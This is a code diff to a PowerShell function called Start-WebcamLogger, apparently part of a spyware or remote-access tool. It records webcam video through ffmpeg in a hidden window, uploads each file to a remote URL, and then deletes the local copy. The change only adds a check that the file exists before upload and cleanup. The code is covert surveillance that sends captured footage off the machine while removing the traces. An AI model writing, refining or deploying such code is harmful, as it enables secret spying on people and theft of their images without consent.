@@ -72,10 +72,14 @@ function Start-WebcamLogger{
         );
 
         Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList $ffmpegArgs -Wait -WindowStyle hidden
-        (New-Object System.Net.WebClient).UploadFile($url,$path) > $null;
+        
+        if(Test-Path $path){
+            (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
+            Remove-Item $path -Force;
+            Start-Sleep $Delay;
+        }
+        
         $count++;
-        Remove-Item $path -Force;
-        Start-Sleep $Delay;
     }
 }
 
